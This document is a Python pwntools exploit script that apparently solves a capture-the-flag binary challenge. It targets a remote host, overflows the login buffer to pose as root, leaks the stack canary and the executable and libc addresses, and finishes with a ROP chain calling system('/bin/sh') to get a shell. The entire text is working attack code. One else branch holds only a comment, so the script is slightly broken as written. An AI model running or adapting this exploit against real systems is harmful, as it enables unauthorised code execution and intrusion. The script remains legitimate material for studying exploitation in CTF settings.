#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def findbyte(x, data, length):
	step = []

	while True:
		if x in data[length:length*2]:
			pos = length + data[length:length*2].index(x) + 1
			step.append(pos - length)
			step.append(length)
			break
		else:
			data = data[length:]
			step.append(length)
	return step

if args.LOCAL:
	p = process(exe.path)
else:
	p = remote("139.162.36.205", 31337)

######################
### Stage 1: Login ###
######################
if args.LOCAL:
	t1 = listen(6666)
	ip = b'127.0.0.1\0'
else:
	# ip = <vps ip string> + b'\0'
p.sendlineafter(b'choice: ', b'1')
payload = b'root\0' + b'A'*123 + p64(0) + ip
p.sendafter(b'Username: ', payload.ljust(0xb0, b'A'))
p.sendafter(b'Password: ', b'\0'*8 + b'B'*0x78)

if args.LOCAL:
	t1.sendline(b'root:$6$tet$tXRYc/J5H1lWOJDDUv2c2yKKc5SJcozGLLyPbIenZuqhv/2bIxX81n6z2KAisRDQvRMNJGAEDpCyCRmODZHO1.:0:0:root:/root:/bin/bash')

############################
### Stage 2: Leak canary ###
############################
p.sendlineafter(b'choice: ', b'2')
if args.LOCAL:
	t1.close()

with open('data/1MB', 'rb') as f:
	datas = f.read()

# Offset 0x108 will concatenate buffer with canary
# But due to null byte at LSB of canary so we overwrite that
# null byte to a byte not null so puts() will print canary out
offset = 0x109
datas = datas[offset:]
p.recvuntil(b'read: ')
p.sendline(b'4')
p.recvuntil(b'read?')
p.sendline(f'{offset}'.encode())

output = p.recvuntil(b'\nHow many bytes to read?', drop=True)
canary = u64(output[offset-1:offset-1+8]) & 0xffffffffffffff00
stack_leak = u64(output[offset-1+8:] + b'\0\0')
log.info("Canary: " + hex(canary))
log.info("stack_leak: " + hex(stack_leak))

# Recover the null byte of canary
for size in findbyte(b'\0', datas, offset):
	datas = datas[size:]
	p.sendline(f'{size}'.encode())
	p.recvuntil(b'\nHow many bytes to read?', drop=True)
p.sendline('-1'.encode())

#################################
### Stage 3: Leak exe address ###
#################################
with open('data/1MB', 'rb') as f:
	datas = f.read()

# Overwrite canary and saved rbp to leak saved rip which is exe address
offset = 0x118
datas = datas[offset:]
p.sendlineafter(b'choice: ', b'2')
p.recvuntil(b'read: ')
p.sendline(b'4')
p.recvuntil(b'read?')
p.sendline(f'{offset}'.encode())

output = p.recvuntil(b'\nHow many bytes to read?', drop=True)
exe_leak = u64(output[offset:offset+6] + b'\0\0')
exe.address = exe_leak - 0x247c
log.info("Exe leak: " + hex(exe_leak))
log.info("Exe base: " + hex(exe.address))

# Recover canary and saved rbp
payload = flat(
	canary, stack_leak,
	)[::-1]
for i in range(len(payload)):
	for size in findbyte(p8(payload[i]), datas, offset - i):
		datas = datas[size:]
		p.sendline(f'{size}'.encode())
		p.recvuntil(b'\nHow many bytes to read?', drop=True)
p.sendline('-1'.encode())


##################################
### Stage 4: Leak libc address ###
##################################
with open('data/1MB', 'rb') as f:
	datas = f.read()

# Overwrite canary, saved rbp, saved rip of the subfunction
# and concate with saved rip of main, which is libc address
offset1 = 0x128
offset2 = 0x120
datas = datas[offset1:]
p.sendlineafter(b'choice: ', b'2')
p.recvuntil(b'read: ')
p.sendline(b'4')
p.recvuntil(b'read?')
p.sendline(f'{offset1}'.encode())

output = p.recvuntil(b'\nHow many bytes to read?', drop=True)
libc_leak = u64(output[offset1:offset1+6] + b'\0\0')
libc.address = libc_leak - 0x29d90
log.info("Libc leak: " + hex(libc_leak))
log.info("Libc base: " + hex(libc.address))

# Recover canary, saved rbp, saved rip of the function
payload = flat(
	canary,
	stack_leak,
	exe_leak,
	)[::-1]
for i in range(len(payload)):
	for size in findbyte(p8(payload[i]), datas, offset2 - i):
		datas = datas[size:]
		p.sendline(f'{size}'.encode())
		p.recvuntil(b'\nHow many bytes to read?', drop=True)
p.sendline('-1'.encode())


##################################
### Stage 5: system("/bin/sh") ###
##################################
with open('data/1MB', 'rb') as f:
	datas = f.read()

p.sendlineafter(b'choice: ', b'2')
p.recvuntil(b'read: ')
p.sendline(b'4')

pop_rdi = libc.address + 0x000000000002a3e5
ret = libc.address + 0x0000000000029cd6
payload = flat(
	canary,
	canary,				# Fake saved rbp
	ret,
	pop_rdi,
	next(libc.search(b'/bin/sh')),
	libc.sym['system']
	)[::-1]

offset = 0x108 + len(payload)
for i in range(len(payload)):
	for size in findbyte(p8(payload[i]), datas, offset - i):
		datas = datas[size:]
		p.sendline(f'{size}'.encode())
		p.recvuntil(b'\nHow many bytes to read?', drop=True)
p.sendline('-1'.encode())

p.interactive()